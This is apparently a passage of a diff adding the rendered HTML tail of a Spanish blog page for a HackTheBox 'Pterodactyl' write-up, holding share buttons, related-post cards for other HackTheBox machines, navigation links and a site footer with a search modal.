+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://twitter.com/intent/tweet/?url=http://localhost:1313/writeups/pterodactyl/&amp;text=HackTheBox%20-%20Pterodactyl"
+          
+          title="Tuitear en Twitter"
+          aria-label="Tuitear en Twitter">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://reddit.com/submit/?url=http://localhost:1313/writeups/pterodactyl/&amp;resubmit=true&amp;title=HackTheBox%20-%20Pterodactyl"
+          
+          title="Publicar en Reddit"
+          aria-label="Publicar en Reddit">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/writeups/pterodactyl/&amp;quote=HackTheBox%20-%20Pterodactyl"
+          
+          title="Compartir en Facebook"
+          aria-label="Compartir en Facebook">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        
+        <a
+          class=" m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          target="_blank"
+          href="https://api.whatsapp.com/send?text=http://localhost:1313/writeups/pterodactyl/&amp;resubmit=true&amp;title=HackTheBox%20-%20Pterodactyl"
+          
+          title=""
+          aria-label="">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+</span>
+        </a>
+      
+    
+  </section>
+
+
+        
+  
+  
+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Relacionados</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/interpreter/featured_hu_5f64be3ee3064464.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/interpreter/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Interpreter
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-23T00:00:00&#43;00:00">23 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">13 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Medium | Conceptos: HL7, Mirth, CVE Público, MariaDB, Red Sanitaria
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/analytics/featured_hu_2b923891fda85175.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/analytics/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Analytics
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-01-24T00:00:00&#43;00:00">24 de enero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Easy | Conceptos: Subdominio, Docker, RCE, Metabase
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/devvortex/featured_hu_2ab73e0c14633511.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/devvortex/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Devvortex
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-11-09T00:00:00&#43;00:00">9 de noviembre de 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Easy | Conceptos: Joomla, CVE Público, MySQL, Pager privesc.
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+    </section>
+  
+
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeups/interpreter/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HackTheBox - Interpreter
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-02-23T00:00:00&#43;00:00">23 de febrero de 2026</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeups/cctv/">
+              <span class="leading-6">
+                HackTheBox - CCTV&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-03-09T00:00:00&#43;00:00">9 de marzo de 2026</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Ir arriba"
+    title="Ir arriba">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Nicolás Seral
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Buscar"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Cerrar (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
